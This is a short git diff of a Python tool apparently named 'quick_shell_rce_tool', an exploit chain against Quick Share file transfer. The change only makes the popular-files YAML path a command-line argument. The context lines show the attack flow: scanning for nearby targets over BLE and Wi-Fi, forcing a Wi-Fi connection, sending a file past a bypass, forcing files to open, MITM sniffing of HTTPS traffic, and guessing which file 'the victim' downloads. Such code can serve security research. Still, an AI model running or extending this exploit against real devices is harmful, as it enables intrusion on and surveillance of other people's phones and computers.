@@ -10,8 +10,6 @@ from quick_shell_rce_tool.config_tools import parse_popular_files_yaml
 from quick_shell_rce_tool.quick_share_discovery import QuickShareWifiLanScanner, QuickShareBleScanner, QuickShareBleDevice
 from quick_shell_rce_tool.quick_share_actions import force_wifi_connection_using_quick_share, send_file_with_bypass_using_quick_share, force_quick_share_to_continuously_open_file
 
-DOMAIN_PATHS_TO_FILES = parse_popular_files_yaml(r"./popular_files.yaml")
-
 
 MIN_ENCRYPTED_FILE_SIZE_OVERHEAD_PERCENTAGE = 0.1
 MAX_ENCRYPTED_FILE_SIZE_OVERHEAD_PERCENTAGE = 15
@@ -88,6 +86,8 @@ def get_target_ip_quick_share_wifi_lan_new_port(quick_share_wifi_lan_scanner: Qu
 
 def main():
     logging.basicConfig(level=logging.INFO)
+    domain_paths_to_files = parse_popular_files_yaml(sys.argv[6])
+
     target_bt_addr = run_choose_target_loop().bt_addr
 
     logging.info("Starting to scan for LAN Quick Share devices in the background...")
@@ -116,7 +116,7 @@ def main():
             mitm_sniffer.open()
             old_mitm_sniffer.close()
 
-        domain_path_monitor = HttpsDomainPathMonitor(mitm_sniffer, DOMAIN_PATHS_TO_FILES.keys())
+        domain_path_monitor = HttpsDomainPathMonitor(mitm_sniffer, domain_paths_to_files.keys())
         domain_path_hit, domain_path_hit_ips = domain_path_monitor.monitor_until_hit()
         domain_ip = domain_path_hit_ips[-1]
         
@@ -142,7 +142,7 @@ def main():
 
         logging.info(f"The victim is trying to download a file with size of about: {data_count / 1024 / 1024} MB")
         
-        guessed_file = guess_file(DOMAIN_PATHS_TO_FILES[domain_path_hit], data_count)
+        guessed_file = guess_file(domain_paths_to_files[domain_path_hit], data_count)
         if guessed_file == None:
             logging.info("Could not find a file that matches the estimated file size")    
             continue
